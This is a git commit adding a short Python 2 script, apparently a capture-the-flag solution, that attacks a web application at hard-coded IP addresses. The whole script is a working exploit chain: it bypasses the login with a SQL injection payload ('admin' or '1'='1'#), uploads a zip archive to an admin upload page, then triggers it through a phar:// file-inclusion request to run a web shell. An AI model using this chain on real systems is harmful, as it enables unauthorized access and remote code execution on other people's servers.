6f2f59e324441000a4c21188dd006e8e0d3d850c
youhouwei <136020930@qq.com>
2018-06-29 15:26:58 +0800

    Revert "Revert "add loadFile python""
    This reverts commit fcd9456af32b7ba8e8d97b72d516bda2579930ac.

---
+++ uploadfile.py
@@ -0,0 +1,23 @@
+import sys
+import re
+import requests
+
+reload(sys)
+sys.setdefaultencoding('utf-8')
+
+def login(session_req):
+	session_req.post('http://123.206.7.206:10002/doLoginUIOPPP.php',
+			data={'username': '''admin' or '1'='1'#''', 'password': 'ss'})
+	return 'success'
+
+def upload_file(session_req):
+	files = {'file': open('D:\PyCharm Community Edition 5.0.3\PycharmProjects\kk.zip', 'rb')}
+	html = session_req.post('http://202.120.7.206:5080/admin/admininfile.php?name=upload', files=files).text
+	return re.findall('>(.*?.zip)</a', html)[0]
+
+def use_shell(session_req, shell):
+	print session_req.get('http://123.206.7.206:10002/admin/admininfile.php?name=phar://../file123asdp/%s/kk' % shell).text
+
+session = requests.Session()
+login(session)
+use_shell(session,upload_file(session))
